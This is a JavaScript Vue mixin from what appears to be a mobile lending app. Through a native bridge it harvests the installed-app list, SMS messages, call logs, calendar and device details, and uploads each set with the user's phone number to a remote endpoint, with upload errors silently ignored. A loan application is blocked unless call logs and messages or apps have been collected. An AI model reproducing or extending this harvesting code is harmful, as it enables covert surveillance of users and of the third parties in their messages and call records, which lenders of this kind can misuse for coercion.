import axios from 'axios';
window.isInitSyncData = false;
window.syncDataResolve = null;
window.syncDataReject = null;
const SYNC_LOCAL_KEY = 'sync-app-data-status';
const DATA_API_HOST = process.env.VUE_APP_UPLOAD_DATA_APIPREFIX;
const NEED_SYNC_TYPE = [
  {
    type: 'appListFunName',
    numKey: 'appListSize',
    saveDataKey: 'app',
  },
  {
    type: 'msgListFunName',
    numKey: 'msgListSize',
    saveDataKey: 'msg',
  },
  {
    type: 'devFunName',
    saveDataKey: 'device',
  },
  {
    type: 'devBaseFunName',
    saveDataKey: 'deviceBase',
  },
  {
    type: 'callLogListFunName',
    numKey: 'callListSize',
    saveDataKey: 'call',
  },
  {
    type: 'calendarFunName',
    saveDataKey: 'calendar',
  },
];

export default {
  data() {
    if (!window.isInitSyncData) {
      NEED_SYNC_TYPE.forEach(t => {
        window[`on${t.type}`] = async data => {
          console.log(`收到${t.type} data:` + JSON.stringify(data));
          if (typeof data == 'string') {
            data = JSON.parse(data);
          }
          if (t.numKey) {
            this.updateLocalSyncNum(t.numKey, data.length);
          }
          if (t.saveDataKey) {
            try {
              let saveData = { mobile: this.userInfo.mobile };
              saveData[t.saveDataKey] = data;
              await axios.post(`${DATA_API_HOST}/original/colombiaUpload`, saveData);
            } catch (error) {}
          }
        };
      });
      window.isInitSyncData = true;
    }

    return {};
  },

  methods: {
    updateLocalSyncNum(type, num) {
      let status = localStorage.getItem(SYNC_LOCAL_KEY);
      console.log('update local sync num', type, num);
      if (!status) {
        status = {};
      } else {
        status = JSON.parse(status);
      }
      status[type] = num;
      localStorage.setItem(SYNC_LOCAL_KEY, JSON.stringify(status));
    },

    // 判断是否可以继续提交申请
    judgeCanApply() {
      return new Promise(async (resolve, reject) => {
        let status = localStorage.getItem(SYNC_LOCAL_KEY);
        if (!status) {
          status = {};
        } else {
          status = JSON.parse(status);
        }
        if (!this.checkInApp()) {
          resolve({ success: true });
        }
        console.log('judge can apply:', status);
        // 只要其中一项有数据就可以继续申请 并且需要有通话记录
        if ((status.appListSize || status.msgListSize) && status.callListSize) {
          resolve({ success: true });
        } else {
          reject({ success: false });
        }
      });
    },

    startSyncData() {
      return new Promise(async (resolve, reject) => {
        try {
          if (!this.userInfo || !this.userInfo.mobile) {
            await this.getUserInfo();
          }
          let types = {};
          NEED_SYNC_TYPE.forEach(t => {
            types[t.type] = `on${t.type}`;
          });
          this.toAppMethod('crawlData', types);
        } catch (error) {
          reject({ success: false });
        }
      });
    },
  },
};
